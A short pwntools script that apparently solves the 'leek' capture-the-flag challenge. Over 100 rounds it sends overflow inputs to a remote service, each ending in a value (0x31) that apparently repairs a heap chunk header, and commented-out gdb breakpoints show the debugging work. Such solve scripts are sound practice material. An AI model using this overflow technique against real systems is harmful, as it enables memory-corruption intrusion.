#!/usr/bin/env python3.8

from pwn import *

context.arch = 'amd64'
context.log_level = 'error'
context.timeout = 120

e = ELF("./leek")

p = remote('challs.actf.co', '31310')
# p = process(e.path)

# gdbscript = '''
# set follow-fork-mode child
# start
# b *0x401541
# b *0x40154f
# b *0x4015e5
# b *0x401695
# b *0x40167a
# b *0x4016ba
# '''
# p = gdb.debug(e.path, gdbscript=gdbscript)

for i in range(100):
    p.recvuntil(b": ")
    payload = b"A" * 64
    p.sendline(payload)

    p.recvuntil(b"secret? ")
    payload = b"A" * 32
    p.send(payload)

    p.recvuntil(b": ")
    payload = b"B" * 24
    payload += p64(0x31)
    p.sendline(payload)
    p.recvuntil(b"Next round!")
    print(i)

p.interactive()
